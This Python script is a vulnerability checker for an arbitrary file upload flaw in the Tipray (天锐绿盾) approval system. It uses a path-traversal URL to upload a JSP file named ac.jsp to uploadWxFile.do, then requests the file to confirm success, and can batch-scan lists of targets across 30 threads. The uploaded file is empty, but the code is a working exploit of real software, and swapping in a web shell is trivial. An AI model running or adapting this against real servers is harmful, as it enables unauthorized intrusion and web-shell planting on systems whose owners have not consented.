import argparse
import textwrap
import warnings
from multiprocessing.dummy import Pool
import requests
import urllib3
# 天锐绿盾审批系统 uploadWxFile.do 存在任意文件上传



def main():
    urllib3.disable_warnings()
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser(description="一个漏洞检测工具",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''示例：python 1111.py -u www.baidu.com / -f url.txt'''))
    parser.add_argument("-u", "--url", dest="url", help="请输入要检测的url地址")
    parser.add_argument("-f", "--file", dest="file", help="请输入要批量检测的文件")
    args = parser.parse_args()
    urls = []
    if args.url:
        if "http" not in args.url:
            args.url = f"http://{args.url}"
        check(args.url)
    elif args.file:
        with open(f"{args.file}", "r") as f:
            for i in f:
                u = i.strip()
                if "http" not in u:
                    u = f"http://{u}"
                    urls.append(u)
                else:
                    urls.append(u)
    pool = Pool(30)
    pool.map(check, urls)


def check(url):
    u = f"{url}/trwfe/service/.%2E/config/uploadWxFile.do"
    files = {
        "file": (
            "ac.jsp",  # 文件名（对应filename="ac.jsp"）
            b"",
            "application/octet-stream"  # 内容类型（对应Content-Type: application/octet-stream）
        )
    }
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown'
    }
    try:
        a = requests.post(url=u, headers=headers, verify=False,timeout=3,files=files)
        a.encoding = 'utf-8'
        html = a.text
        b = a.status_code
        print(html)
        if b == 200 and 'true' in html:
            yanzheng=requests.get(url=f'{url}/ac.jsp', headers=headers, verify=False,timeout=3)
            if yanzheng.status_code==200:
                print("上传成功",f'src:{url}/ac.jsp')
            else:
                print("上传失败")
        else:
            print('[-]不存在漏洞',url)
    except Exception as i:
        print('[x]请求发生错误',url)


if __name__ == '__main__':
    banner = '''
    $$\                                                                   
$$ |                                                                  
$$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$\   $$$$$$\  
$$  __$$\  \____$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |
$$ |  $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
$$ |  $$ |\$$$$$$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$ |
\__|  \__| \_______| \______/  \____$$ | \______/ \__|  \__| \____$$ |
                              $$\   $$ |                    $$\   $$ |
                              \$$$$$$  |                    \$$$$$$  |
                               \______/                      \______/ 

    '''
    print(banner)
    main()

